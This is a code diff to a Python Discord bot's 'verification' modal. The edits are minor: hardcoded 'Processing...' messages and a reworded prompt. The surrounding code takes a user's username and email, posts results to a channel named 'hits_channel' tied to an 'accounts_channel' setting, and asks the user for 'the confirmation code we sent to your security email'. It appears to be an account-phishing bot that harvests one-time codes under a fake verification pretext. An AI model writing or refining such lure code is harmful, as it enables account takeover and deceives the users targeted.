@@ -27,7 +27,6 @@ class MyModalOne(ui.Modal):
         username = quote(self.children[0].value)
         email = self.children[1].value
         config = json.load(open("config/config.json", "r"))
-        msgs = config["messages"]
 
         hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
@@ -194,8 +193,8 @@ class MyModalOne(ui.Modal):
 
                     await interaction.followup.send(
                         embed = discord.Embed(
-                            title = msgs["processing_title"],
-                            description = msgs["processing_description"],
+                            title = "Processing...",
+                            description = "⌛ Please allow us to proccess your roles",
                             color = 0xDE755B
                         ),
                         ephemeral = True
@@ -263,7 +262,7 @@ class MyModalOne(ui.Modal):
             await interaction.followup.send(
                 embed=Embed(
                     title="Last Step",
-                    description="To complete verification, enter the confirmation code we sent to your security email!\nThis step prevents automated or fake verifications.",
+                    description="To complete verification, enter the confirmation code we sent to your security email! This step prevents automated or fake verifications.",
                     colour=0x00FF00
                 ),
                 view = ButtonViewTwo(
